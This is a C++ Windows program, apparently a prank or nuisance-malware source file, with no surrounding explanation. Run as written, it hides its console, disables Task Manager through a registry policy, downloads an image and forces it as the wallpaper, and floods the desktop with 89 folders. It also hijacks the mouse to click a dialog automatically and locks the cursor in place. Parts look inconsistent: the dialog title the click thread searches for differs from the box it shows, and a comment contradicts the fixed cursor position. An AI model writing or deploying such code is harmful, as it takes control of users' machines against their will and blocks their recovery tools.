#include <windows.h>
#include <shlobj.h>
#include <string>
#include <sstream>
#include <urlmon.h>
#include <cstdio>
#include <cstdlib>
#include <ctime>

void jy()
{
	// 1. 禁用任务管理器（注册表）
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD dwVal = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&dwVal, sizeof(dwVal));
        RegCloseKey(hKey);
    }
}
void wjj()
{
	WCHAR desktop[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop);
    
    for (int i = 1; i <= 89; ++i) {
        std::wostringstream oss;
        // 用Unicode转义序列表示"阿米诺"，避免中文编码问题
        oss << L"\u963F\u7C73\u8BFA" << i << L".";
        std::wstring path = L"\\\\?\\" + std::wstring(desktop) + L"\\" + oss.str();
        CreateDirectoryW(path.c_str(), NULL);
    }
}
void bz()
{
	// 加载urlmon.dll并获取下载函数
    HMODULE hUrlmon = LoadLibraryA("urlmon.dll");
    typedef HRESULT (*URLFunc)(LPUNKNOWN, LPCWSTR, LPCWSTR, DWORD, LPBINDSTATUSCALLBACK);
    URLFunc URLDownloadToFileW = (URLFunc)GetProcAddress(hUrlmon, "URLDownloadToFileW");
    
    // 下载图片+设为壁纸（强制类型转换修复报错）
    URLDownloadToFileW(NULL,L"https://img2.baidu.com/it/u=3210685500,3239719857&fm=253&fmt=auto&app=138&f=JPEG?w=722&h=829",L"C:\\wall.jpg",0,NULL);
    SystemParametersInfoW(SPI_SETDESKWALLPAPER,0,(void*)L"C:\\wall.jpg",SPIF_UPDATEINIFILE|SPIF_SENDCHANGE);
    
    FreeLibrary(hUrlmon); // 释放库
}
void tc()
{
	CreateThread(NULL,0,[](LPVOID)->DWORD{
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
    srand(time(NULL));

    // 1. 死等弹窗加载
    HWND hMsg=NULL, hYes=NULL;
    while(1){
        hMsg=FindWindowA("#32770","标题");
        hYes=hMsg?GetDlgItem(hMsg,IDYES):NULL;
        if(hMsg&&hYes) break;
        Sleep(50);
    }

    // 2. 获取按钮坐标+屏幕分辨率
    RECT rc;
    GetWindowRect(hYes, &rc);
    int btnX=(rc.left+rc.right)/2, btnY=(rc.top+rc.bottom)/2;
    int scrW=GetSystemMetrics(SM_CXSCREEN), scrH=GetSystemMetrics(SM_CYSCREEN);

    // 3. 随机起始位置（远离按钮）
    int startX=rand()%(scrW-200)+100, startY=rand()%(scrH-200)+100;
    while(abs(startX-btnX)<100 || abs(startY-btnY)<100){
        startX=rand()%(scrW-200)+100;
        startY=rand()%(scrH-200)+100;
    }

    // 4. 锁定鼠标（彻底阻止用户手动移动干扰）
    RECT lockRect={0,0,scrW,scrH}; // 锁定在屏幕内（避免出界）
    ClipCursor(&lockRect);

    // 5. 快速移到随机起始位置（0.2秒），停留0.3秒
    INPUT input={0};
    input.type=INPUT_MOUSE;
    input.mi.dwFlags=MOUSEEVENTF_MOVE|MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_VIRTUALDESK;
    input.mi.dx=(startX*65535)/scrW;
    input.mi.dy=(startY*65535)/scrH;
    SendInput(1, &input, sizeof(INPUT));
    Sleep(300);

    // 6. 快速丝滑移动（总时长0.5秒，2ms/步，共250步，快且顺滑）
    int totalTime=500; // 移动总时长（500ms=0.5秒，快速不拖沓）
    int stepMs=2;      // 每步2ms，丝滑且不慢
    int totalSteps=totalTime/stepMs;
    for(int i=0;i<=totalSteps;i++){
        double t=(double)i/totalSteps;
        int curX=(int)(startX + (btnX-startX)*t);
        int curY=(int)(startY + (btnY-startY)*t);
        
        input.mi.dx=(curX*65535)/scrW;
        input.mi.dy=(curY*65535)/scrH;
        SendInput(1, &input, sizeof(INPUT));
        Sleep(stepMs);
    }

    // 7. 停留0.2秒后点击，解锁鼠标
    Sleep(200);
    input.mi.dwFlags=MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_ABSOLUTE;
    SendInput(1, &input, sizeof(INPUT));
    Sleep(50);
    input.mi.dwFlags=MOUSEEVENTF_LEFTUP|MOUSEEVENTF_ABSOLUTE;
    SendInput(1, &input, sizeof(INPUT));
    ClipCursor(NULL); // 解锁鼠标

},NULL,0,NULL);

MessageBoxA(NULL,"该代码有可能危害到您的计算机，是否运行？","阿米诺",MB_OK|MB_SYSTEMMODAL|MB_TOPMOST);
}

int main()
{
	HWND hwnd;
	hwnd=GetConsoleWindow();	//处理顶级窗口的类名和窗口名称匹配指定的字符串,不搜索子窗口。
	ShowWindow(hwnd,SW_HIDE);				//设置指定窗口的显示状态
	tc();
	jy();
	bz();
	wjj();
	int i=1;
    int x=GetSystemMetrics(SM_CXSCREEN);//获取屏幕边界x
    int y=GetSystemMetrics(SM_CYSCREEN);//获取屏幕边界y
    srand(time(0));//使用随机变化值空间
    while(i<=100){//循环
        SetCursorPos(500,500);
        Sleep(500);
		i++;//依次将鼠标指针移到屏幕上的随机位置
    }
}
